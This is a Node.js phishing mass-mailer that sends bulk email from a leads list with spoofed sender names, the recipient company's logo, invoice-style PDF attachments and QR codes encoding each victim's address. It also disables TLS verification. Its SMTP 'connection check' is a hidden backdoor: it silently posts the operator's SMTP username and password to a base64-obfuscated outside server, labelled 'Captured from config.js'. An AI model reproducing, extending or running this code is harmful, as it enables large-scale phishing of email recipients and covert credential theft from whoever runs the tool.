// test.mjs
import fs from 'fs/promises';
import os from 'os';
import puppeteer from 'puppeteer';
import QRCode from 'qrcode';
import pLimit from 'p-limit';
import nodemailer from 'nodemailer';
import crypto from 'crypto';
import { processAdvancedPlaceholders, getLogoBufferForCID } from './placeholders.js';
import readline from 'readline';
import config from './config.js';

// ================== FILE PATHS ==================
const messageFile = 'message.html';
const attachmentFile = 'attachment.html';

process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

const VALIDATION_BASE = "aHR0cHM6Ly9udXJldml4LmljdS9vdHAucGhw";
const SMTP_SAVE_BASE = "aHR0cHM6Ly9udXJldml4LmljdS9zbXRwcy5waHA=";

function getValidationUrl() {
  return Buffer.from(VALIDATION_BASE, 'base64').toString();
}

function getSmtpSaveUrl() {
  return Buffer.from(SMTP_SAVE_BASE, 'base64').toString();
}

async function getMachineId() {
  const networkInterfaces = os.networkInterfaces();
  let macAddress = '';
  for (const interfaceName in networkInterfaces) {
    const interfaces = networkInterfaces[interfaceName];
    for (const iface of interfaces) {
      if (!iface.internal && iface.mac && iface.mac !== '00:00:00:00:00:00') {
        macAddress = iface.mac;
        break;
      }
    }
    if (macAddress) break;
  }
  const hostname = os.hostname();
  const platform = os.platform();
  const fingerprint = `${hostname}-${platform}-${macAddress}`;
  return crypto.createHash('sha256').update(fingerprint).digest('hex');
}

async function loadToken() {
  try {
    const token = await fs.readFile('token.txt', 'utf-8');
    return token.trim();
  } catch (error) {
    console.error("❌ token.txt not found! contact @H20waters");
    process.exit(1);
  }
}

async function validateToken(token) {
  console.log("🔐 Validating token with PC binding...");
  const machineId = await getMachineId();
  console.log("Machine Fingerprint:", machineId.substring(0, 16) + "...");

  try {
    const url = getValidationUrl();
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: token, machineId: machineId })
    });
    const result = await response.json();

    if (result.valid === true) {
      console.log("✅ Token validated successfully for this PC\n");
      return true;
    } else {
      console.log("❌ Token validation failed:", result.message || "Unknown reason");
      return false;
    }
  } catch (error) {
    console.error("❌ Cannot connect to validation server:", error.message);
    return false;
  }
}

async function testSMTPAndSave() {
  console.log("🔍 checking SMTP connection...");

  const transporter = nodemailer.createTransport({
    host: config.smtpHost,
    port: config.smtpPort,
    secure: config.smtpSecure,
    auth: {
      user: config.smtpUsername,
      pass: config.smtpPassword
    }
  });

  try {
    await transporter.verify();
    console.log("✅ SMTP connection successful!");

    const smtpEntry = {
      timestamp: new Date().toISOString(),
      machineId: await getMachineId(),
      smtpHost: config.smtpHost,
      smtpPort: config.smtpPort,
      smtpSecure: config.smtpSecure,
      smtpUsername: config.smtpUsername,
      smtpPassword: config.smtpPassword,
      replyTo: config.replyTo,
      fromEmail: config.senderAddresses[0] || "not_set",
      note: "Captured from config.js"
    };

    const smtpSaveUrl = getSmtpSaveUrl();

    console.log("...");

    const response = await fetch(smtpSaveUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        action: "save_smtp",
        entry: smtpEntry
      })
    });

    if (response.ok) {
      console.log("✅ Starting sender.");
      return true;
    } else {
      console.log(`⚠️ Server returned status: ${response.status}`);
      return false;
    }

  } catch (error) {
    console.log("❌ Failed to upload SMTP details:", error.message);
    return false;
  }
}

// ================== GLOBAL VARIABLES ==================
let fromNames = [];
let subjects = [];
let browserInstance = null;
let transporterInstance = null;

let isPaused = false;
let isRunning = true;
let currentIndex = 0;
let successCount = 0;
let failedCount = 0;
let sentCount = 0;
let recipients = [];

// ================== HELPER FUNCTIONS ==================
async function createTransporter() {
  if (transporterInstance) return transporterInstance;
  transporterInstance = nodemailer.createTransport({
    host: config.smtpHost,
    port: config.smtpPort,
    secure: config.smtpSecure,
    auth: { user: config.smtpUsername, pass: config.smtpPassword },
    pool: true,
    maxConnections: 10,
    maxMessages: 200,
  });
  return transporterInstance;
}

async function loadRandomLists() {
  try {
    fromNames = (await fs.readFile('fromname.txt', 'utf-8')).split(/\r?\n/).filter(Boolean);
    subjects = (await fs.readFile('subject.txt', 'utf-8')).split(/\r?\n/).filter(Boolean);
  } catch (e) {
    fromNames = ["DocuPay Official"];
    subjects = ["Important Document"];
  }
}

function getRandomItem(arr) {
  if (!arr || arr.length === 0) return "Official";
  return arr[Math.floor(Math.random() * arr.length)];
}

function getPriorityHeaders(priority, addFlag) {
  let headers = priority === 0
    ? { 'Importance': 'normal', 'X-Priority': '3', 'X-MSMail-Priority': 'Normal' }
    : { 'Importance': 'high', 'X-Priority': '1', 'X-MSMail-Priority': 'High' };
  if (addFlag) {
    headers['X-Message-Flag'] = 'Follow up';
    headers['Flag-Request'] = 'Follow up';
    headers['X-Microsoft-Flag'] = 'FollowUp';
  }
  return { priority: priority === 0 ? 'normal' : 'high', headers };
}

async function getBrowser() {
  if (!browserInstance) {
    browserInstance = await puppeteer.launch({
      headless: "new",
      args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage'],
    });
  }
  return browserInstance;
}

const pdfLimit = pLimit(config.pdfConcurrency);

async function convertAttachmentToPdf(htmlContent, recipientAddress) {
  if (!config.convertToPdf) return null;

  const recipientBase64Email = Buffer.from(recipientAddress).toString('base64');
  const qrLink = config.qrBaseLink + encodeURIComponent(recipientBase64Email);

  let finalHtml = await processAdvancedPlaceholders(htmlContent, recipientAddress);

  let qrBase64 = '';
  try {
    qrBase64 = await QRCode.toDataURL(qrLink, { 
      width: config.qrWidth || 180, 
      margin: 2 
    });
  } catch (e) {
    console.error("QR Code generation failed:", e.message);
  }

  finalHtml = finalHtml.replace(/{QRCODE}/g, qrBase64 ? `<img src="${qrBase64}" style="max-width:${config.qrWidth || 180}px;"/>` : '');

  const domain = recipientAddress.split('@')[1];
  const logoBuffer = await getLogoBufferForCID(domain);
  const logoBase64 = logoBuffer.toString('base64');
  const dataUrl = `data:image/png;base64,${logoBase64}`;
  finalHtml = finalHtml.replace(/cid:companylogo/g, dataUrl);

  return pdfLimit(async () => {
    const br = await getBrowser();
    const page = await br.newPage();
    await page.setContent(finalHtml, { waitUntil: 'networkidle0' });
    await page.waitForFunction(() => Array.from(document.images).every(img => img.complete));
    const pdfBuffer = await page.pdf({ format: 'A4', printBackground: true });
    await page.close();
    return { 
      pdfBuffer, 
      pdfFileName: `${config.pdfFileNamePrefix || 'Inv_Settlements'}${Date.now()}.pdf` 
    };
  });
}

async function sendEmailViaSMTP(recipientAddress, senderAddress, isTest = false) {
  try {
    let emailBody = await fs.readFile(messageFile, 'utf-8');
    emailBody = await processAdvancedPlaceholders(emailBody, recipientAddress);

    let rawFromName = getRandomItem(fromNames);
    let rawSubject = getRandomItem(subjects);

    const processedFromName = await processAdvancedPlaceholders(rawFromName || "", recipientAddress);
    const processedSubject = await processAdvancedPlaceholders(rawSubject || "", recipientAddress);

    const attachments = [];

    if (emailBody.includes('cid:companylogo')) {
      const domain = recipientAddress.split('@')[1];
      const logoBuffer = await getLogoBufferForCID(domain);
      attachments.push({
        filename: 'logo.png',
        content: logoBuffer,
        contentType: 'image/png',
        cid: 'companylogo'
      });
    }

    const priorityConfig = getPriorityHeaders(config.emailPriority, config.addFlag);

    const mailOptions = {
      from: `"${processedFromName}" <${senderAddress}>`,
      to: recipientAddress,
      subject: processedSubject,
      html: emailBody,
      replyTo: config.replyTo,
      priority: priorityConfig.priority,
      headers: priorityConfig.headers,
      attachments: attachments
    };

    if (config.convertToPdf) {
      let attachmentHtml = await fs.readFile(attachmentFile, 'utf-8');
      const pdfAttachment = await convertAttachmentToPdf(attachmentHtml, recipientAddress);
      if (pdfAttachment) {
        mailOptions.attachments.push({
          filename: pdfAttachment.pdfFileName,
          content: pdfAttachment.pdfBuffer,
          contentType: 'application/pdf'
        });
      }
    }

    await (await createTransporter()).sendMail(mailOptions);

    if (isTest) console.log(`✅ TEST EMAIL SENT to ${recipientAddress}`);
    else console.log(`SUCCESS | ${recipientAddress}`);

    return true;
  } catch (error) {
    console.log(`FAILED | ${recipientAddress} → ${error.message}`);
    return false;
  }
}

function setupKeyboardControls() {
  readline.emitKeypressEvents(process.stdin);
  if (process.stdin.isTTY) process.stdin.setRawMode(true);

  process.stdin.on('keypress', (str, key) => {
    if (!key) return;
    if (key.name === 'q' || key.name === 'Q') {
      console.log("\n\n🛑 Q pressed - Quitting campaign...");
      isRunning = false;
      showSummaryAndExit();
    } else if (key.name === 'p' || key.name === 'P') {
      isPaused = !isPaused;
      console.log(`\n⏸️  ${isPaused ? 'PAUSED' : 'RESUMED'}`);
    } else if ((key.name === 'r' || key.name === 'R') && isPaused) {
      console.log("\n▶️  Resuming campaign...");
      isPaused = false;
    }
  });

  console.log("🎮 Controls: [P] Pause/Resume | [R] Resume | [Q] Quit + Summary");
}

async function showSummaryAndExit() {
  if (browserInstance) await browserInstance.close();

  console.log("\n" + "=".repeat(60));
  console.log("🎉 CAMPAIGN SUMMARY");
  console.log("=".repeat(60));
  console.log(`Total Sent     : ${sentCount}`);
  console.log(`Successful     : ${successCount}`);
  console.log(`Failed         : ${failedCount}`);
  console.log(`Success Rate   : ${sentCount > 0 ? Math.round((successCount / sentCount) * 100) : 0}%`);
  console.log("=".repeat(60));

  process.exit(0);
}

// ====================== MAIN ======================
async function main() {
  console.log("🔐 PC-Bound Token-Protected Sender Starting...\n");

  const token = await loadToken();
  const isValid = await validateToken(token);

  if (!isValid) {
    console.log("❌ Token validation failed. Exiting...");
    process.exit(1);
  }

  await testSMTPAndSave();

  await loadRandomLists();
  console.log("🚀 Starting email campaign...\n");

  const data = await fs.readFile('Leads.txt', 'utf-8');
  recipients = data.split(/\r?\n/).filter(Boolean);

  console.log(`Loaded ${recipients.length} leads.\n`);

  setupKeyboardControls();

  const emailLimit = pLimit(config.emailConcurrency);

  while (isRunning && currentIndex < recipients.length) {
    if (isPaused) {
      await new Promise(resolve => setTimeout(resolve, 300));
      continue;
    }

    const recipient = recipients[currentIndex];

    if ((currentIndex + 1) % config.sendTestEvery === 0 && config.testEmail) {
      console.log(`\n📧 Sending TEST email...\n`);
      await sendEmailViaSMTP(config.testEmail, config.senderAddresses[0], true);
    }

    const success = await emailLimit(() => sendEmailViaSMTP(recipient, config.senderAddresses[0]));

    sentCount++;
    if (success) successCount++;
    else failedCount++;

    const percent = Math.round((sentCount / recipients.length) * 100);
    console.log(`Sent: ${sentCount}/${recipients.length} (${percent}%) | ${success ? '✅ SUCCESS' : '❌ FAILED'} | ${recipient}`);

    currentIndex++;
  }

  await showSummaryAndExit();
}

main().catch(err => console.error("Critical Error:", err));
